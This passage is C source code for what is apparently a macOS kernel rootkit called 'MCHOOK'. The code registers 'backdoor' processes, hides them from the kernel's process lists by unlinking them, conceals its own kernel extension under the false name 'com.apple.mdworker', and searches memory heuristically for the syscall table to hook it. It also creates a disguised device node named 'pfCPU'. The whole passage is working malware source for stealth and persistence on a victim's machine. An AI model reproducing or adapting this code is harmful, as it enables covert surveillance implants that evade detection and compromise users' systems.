    _index = g_next_free_index;
    g_next_free_index = -1;
    
    if (g_backdoor_counter_static == 0)
      g_backdoor_counter_static++;
  }
  else {
    MALLOC(g_reg_backdoors[g_backdoor_counter_static],
           reg_backdoors_t *,
           sizeof(reg_backdoors_t),
           MK_MBUF,
           M_WAITOK);
    
    _index = g_backdoor_counter_static;
    g_backdoor_counter_static++;
  }
  
  //g_backdoor_current = _index;
  
  // Initialize pathCounter instance variable
  g_reg_backdoors[_index]->pathCounter = 0;
  
  // and pid
  g_reg_backdoors[_index]->p            = p;
  g_reg_backdoors[_index]->pid          = p->p_pid;
  g_reg_backdoors[_index]->isActive     = 1;
  g_reg_backdoors[_index]->isHidden     = 0;
  g_reg_backdoors[_index]->isTaskHidden = 0;
  g_reg_backdoors[_index]->isProcHidden = 0;
  
  strncpy(g_reg_backdoors[_index]->username, userName, MAX_USER_SIZE);
  g_backdoor_counter++;
  
#ifdef DEBUG
  printf("[MCHOOK] index (%d)\n", _index);
  printf("[MCHOOK] user (%s)\n", g_reg_backdoors[_index]->username);
#endif
}


int remove_dev_entry()
{
  // Remove our device entry from /dev
	devfs_remove(devfs_handle);
	cdevsw_remove(major, &chardev);
  
  return 0;
}

void dealloc_meh(char *userName, pid_t pid)
{
  int z = -1;
  int i = 0;
  
  for (i = 0; i < g_backdoor_counter_static; i++) {
    if (strncmp(g_reg_backdoors[i]->username, userName, MAX_USER_SIZE) == 0
        && g_reg_backdoors[i]->pid == pid
        && g_reg_backdoors[i]->isActive == 1) {
      z = i;
    }
  }
  
  if (z != -1) {
    //FREE(g_reg_backdoors[z], MK_MBUF);
    g_reg_backdoors[z]->isActive = 0;
    g_reg_backdoors[z]->isHidden = 0;
    g_reg_backdoors[z]->isTaskHidden = 0;
    g_reg_backdoors[z]->isProcHidden = 0;
    g_next_free_index = z;
    if (g_backdoor_counter > 0)
      g_backdoor_counter--;
  }
}

int get_backdoor_index(proc_t p, char *username)
{
  int i  = 0;
  
  for (i = 0; i < g_backdoor_counter_static; i++) {
    if (g_reg_backdoors[i]->pid == p->p_pid
        && (strncmp(username, g_reg_backdoors[i]->username, MAX_USER_SIZE) == 0)
        && g_reg_backdoors[i]->isActive == 1) {
      return i;
    }
  }
  
  return -1;
}

int check_symbols_integrity()
{
  if (i_allproc               != NULL
      && i_tasks              != NULL
      && i_nsysent            != NULL
      && i_kmod               != NULL
      && i_tasks_count        != NULL
      && i_nprocs             != NULL
      && i_tasks_threads_lock != NULL
      && i_proc_lock          != NULL
      && i_proc_unlock        != NULL
      && i_proc_list_lock     != NULL
      && i_proc_list_unlock   != NULL) {
    g_symbols_resolved = 1;
    return 1;
  }
  
  g_symbols_resolved = 0;
  
  return 0;
}

int is_leopard()
{
  if (g_os_major    == 10
      && g_os_minor == 5)
    return 1;
  
  return 0;
}

#pragma mark -
#pragma mark DKOM
#pragma mark -

int hide_proc(proc_t p, char *username, int backdoor_index)
{
  proc_t proc = NULL;
  //int _index  = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] Hiding proc: %d\n", p->p_pid);
#endif
#if 0
  //
  // g_backdoor_current is not safe for 2 or more backdoors on the same machine
  // in which case we'll be calling get_backdoor_index
  //
  if (g_backdoor_current != -1) {
    if (g_reg_backdoors[g_backdoor_current]->isHidden == 1) {
#ifdef DEBUG
      printf("[MCHOOK] %d is already hidden\n", p->p_pid);
#endif
      
      return 0;
    }
  }
  else {
    if ((_index = get_backdoor_index(p, username)) != -1) {
      g_backdoor_current = _index;
    }
    else {
#ifdef DEBUG
      printf("[MCHOOK] hide_proc failed - backdoor not registered?!!\n");
#endif

      return -1;
    }
  }
#endif
#ifdef DEBUG
  printf("[MCHOOK] Be-hiding tasks count: %d\n", *i_tasks_count);
#endif
  /*
  if (g_os_major == 10 && g_os_minor == 5) {
    task_l_t task = p->task;
    
    //
    // Unlinking task
    //
    lck_mtx_lock(i_tasks_threads_lock);
    queue_remove(i_tasks, task, task_l_t, tasks);
    (*i_tasks_count)--;
    lck_mtx_unlock(i_tasks_threads_lock);
    
    g_reg_backdoors[backdoor_index]->isTaskHidden = 1;
  }
  else if (g_os_major == 10 && g_os_minor == 6) {
    task_t task = p->task;
    
    //
    // Unlinking task
    //
    lck_mtx_lock(i_tasks_threads_lock);
    queue_remove(i_tasks, task, task_t, tasks);
    (*i_tasks_count)--;
    lck_mtx_unlock(i_tasks_threads_lock);
    
    g_reg_backdoors[backdoor_index]->isTaskHidden = 1;
  }
  */
#ifdef DEBUG
  printf("[MCHOOK] Af-hiding tasks count: %d\n", *i_tasks_count);
#endif
  
  i_proc_list_lock();
  
  //
  // Unlinking proc
  //
  LIST_FOREACH(proc, i_allproc, p_list) {
    if (proc->p_pid == p->p_pid) {
#ifdef DEBUG
      printf("[MCHOOK] pid %d found\n", p->p_pid);
#endif
      
      i_proc_lock(proc);
      
      LIST_REMOVE(proc, p_list);
      LIST_REMOVE(proc, p_hash);
      
      i_proc_unlock(proc);
      //(*i_nprocs)--;
      
#ifdef DEBUG
      printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif
      
      g_reg_backdoors[backdoor_index]->isProcHidden = 1;
      break;
    }
    
    //i_proc_unlock(proc);
  }
  
  i_proc_list_unlock();
  
  if (g_reg_backdoors[backdoor_index]->isTaskHidden     == 1
      || g_reg_backdoors[backdoor_index]->isProcHidden  == 1) {
#ifdef DEBUG
    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[backdoor_index]->isTaskHidden);
    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[backdoor_index]->isProcHidden);
#endif
    g_reg_backdoors[backdoor_index]->isHidden = 1;
  }
  
  return 0;
}

int unhide_proc(proc_t p, int backdoor_index)
{
#ifdef DEBUG
  printf("[MCHOOK] Unhiding %d\n", p->p_pid);
#endif
  /*
  if (g_reg_backdoors[backdoor_index]->isTaskHidden == 1) {
    if (g_os_major == 10 && g_os_minor == 5) {
      task_l_t task = p->task;
      
      //
      // Link back our task entry
      //
      lck_mtx_lock(i_tasks_threads_lock);
      queue_enter(i_tasks, task, task_l_t, tasks);
      (*i_tasks_count)++;
      lck_mtx_unlock(i_tasks_threads_lock);
      
      g_reg_backdoors[backdoor_index]->isTaskHidden = 0;
    }
    else if (g_os_major == 10 && g_os_minor == 6) {
      task_t task = p->task;
      
      //
      // Link back our task entry
      //
      lck_mtx_lock(i_tasks_threads_lock);
      queue_enter(i_tasks, task, task_t, tasks);
      (*i_tasks_count)++;
      lck_mtx_unlock(i_tasks_threads_lock);
      
      g_reg_backdoors[backdoor_index]->isTaskHidden = 0;
    }
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] Skipping task unhide, not hidden\n");
#endif
  }
  */
  //
  // Link back our proc entry
  //
  if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
    i_proc_list_lock();
    LIST_INSERT_HEAD(i_allproc, p, p_list);
    //(*i_nprocs)++;
    i_proc_list_unlock();
    
    g_reg_backdoors[backdoor_index]->isProcHidden = 0;
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] Skipping proc unhide, not hidden\n");
#endif
  }
  
  g_reg_backdoors[backdoor_index]->isHidden       = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
#endif  
  
  return 0;
}

int unhide_all_procs()
{
#ifdef DEBUG
  printf("[MCHOOK] Unhiding all procs\n");
#endif
  
  int i  = 0;
  
  for (i = 0; i < g_backdoor_counter_static; i++) {
    if (g_reg_backdoors[i]->isActive    == 1
        && g_reg_backdoors[i]->isHidden == 1) {
      unhide_proc(g_reg_backdoors[i]->p, i);
    }
  }
  
  return 0;
}

void hide_kext_leopard()
{
  kmod_info_t *k, *prev_k;
  //char kext_name[]        = "com.revenge.kext.machooker";
  char kext_name[]        = "com.apple.mdworker";
  
  prev_k  = i_kmod;
  
  if (g_kext_hidden == 0) {
    for (k = i_kmod; k->next != NULL; k = k->next) {
      if (strncmp(k->name, kext_name, sizeof(kext_name)) == 0) {
#ifdef DEBUG
        printf("[MCHOOK] kext found\n");
        printf("[MCHOOK] kext @ %p\n", k);
        printf("[MCHOOK] kext name: %s\n", k->name);
        printf("[MCHOOK] prev kext @ %p\n", prev_k);
        printf("[MCHOOK] prev kext name: %s\n", prev_k->name);
        printf("[MCHOOK] prev kext next: %p\n", prev_k->next);
#endif
        
        prev_k->next = prev_k->next->next;
        g_kext_hidden = 1;
        break;
      }
      
      prev_k = k;
    }
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] KEXT is already hidden\n");
#endif
  }

}

//
// Landon Fuller trick updated for SL support
//
static struct sysent 
*find_sysent(os_version_t *os_ver)
{
  unsigned int table_size;
  struct sysent *table = NULL;
  uint32_t x = 0;
  uint32_t size_of_block_to_search = 0x100;
  
  table_size = sizeof(struct sysent) * (*i_nsysent);
  if (os_ver->major     == 10
      && os_ver->minor  == 5) {
#ifdef DEBUG
    printf("[MCHOOK] find_sysent for leopard\n");
    printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
#endif
    table = (struct sysent *)(((char *)i_nsysent) + sizeof(int));
#if __i386__
    // +28 bytes, so far still reliable
    table = (struct sysent *)(((uint8_t *)table) + 28);
#endif
  }
  else if (os_ver->major    == 10
           && os_ver->minor == 6) {
#ifdef DEBUG
    printf("[MCHOOK] find_sysent for snow leopard\n");
    printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
#endif
    table = (struct sysent *)((char *)i_nsysent);
#if __i386__
    //
    // -0x2850 bytes from nsysent
    // http://packetstormsecurity.org/papers/attack/osx1061sysent.txt
    //
    table = (struct sysent *)((char *)table - 0x2850);
    
    //
    // -0x60 bytes 10.6.4
    //
    table = (struct sysent *)((char *)table - size_of_block_to_search);
#ifdef DEBUG
    printf("[MCHOOK] Entering heuristic\n");
#endif
    
    char *ptr_to_table = (char *)table;
    
    for (x = 0; x <= size_of_block_to_search; x++) {
      table = (struct sysent *)ptr_to_table++;
      
      // Sanity check
      if (table[SYS_syscall].sy_narg    == 0 &&
          table[SYS_exit].sy_narg       == 1 &&
          table[SYS_fork].sy_narg       == 0 &&
          table[SYS_read].sy_narg       == 3 &&
          table[SYS_wait4].sy_narg      == 4 &&
          table[SYS_ptrace].sy_narg     == 4) {
#ifdef DEBUG
        printf("[MCHOOK] heuristic matched sysent @%p, x = 0x%x\n", table, x);
#endif

        return table;
      }
    }
#endif
  }

  if (table == NULL)
    return NULL;
  
#ifdef DEBUG
  printf("[MCHOOK] nsysent@%p\n[MCHOOK] sysent@%p\n", i_nsysent, table);
#endif

  // Sanity check
  if (table[SYS_syscall].sy_narg    == 0 &&
      table[SYS_exit].sy_narg       == 1 &&
      table[SYS_fork].sy_narg       == 0 &&
      table[SYS_read].sy_narg       == 3 &&
      table[SYS_wait4].sy_narg      == 4 &&
      table[SYS_ptrace].sy_narg     == 4) {
#ifdef DEBUG
    printf("[MCHOOK] sysent sanity check succeeded\n");
#endif
    
    return table;
  }
  else {
#ifdef DEBUG
    printf("[MCHOOK] sanity check failed\n");
#endif
    
    return NULL;
  }
}

#pragma mark -
#pragma mark Start/Stop
#pragma mark -

kern_return_t
mchook_start (kmod_info_t *ki, void *d)
{
#ifdef DEBUG
  printf("[MCHOOK] Registering our device\n");
#endif
  
  // Register our device in /dev
  major = cdevsw_add(major, &chardev);
  if (major == -1) {
#ifdef DEBUG
    printf("[MCHOOK] Error while registering the device node\n");
#endif
    return KERN_FAILURE;
  }
  
  devfs_handle = devfs_make_node(makedev(major, 0),
                                 DEVFS_CHAR,
                                 UID_ROOT,
                                 GID_WHEEL,
                                 0666,
                                 "pfCPU");
  
  if (!devfs_handle) {
#ifdef DEBUG
    printf("[MCHOOK] Error while creating the device node\n");
#endif
    return KERN_FAILURE;
  }
  
  return KERN_SUCCESS;
}

kern_return_t
mchook_stop (kmod_info_t *ki, void *d)
{
#ifdef DEBUG
  printf("[MCHOOK] KEXT stop called\n");
#endif
  
  if (g_backdoor_counter == 0) {
    if (remove_dev_entry() == 0) {
#ifdef DEBUG
      printf("[MCHOOK] KEXT unloaded correctly\n");
#endif
    }
    else {
#ifdef DEBUG
      printf("[MCHOOK] An error occurred while unloading KEXT\n");
#endif
    }
      
    remove_hooks();
  }
  
#ifdef DEBUG
  printf("[MCHOOK] Exiting, have phun dude\n");
#endif
  
  return KERN_SUCCESS;
}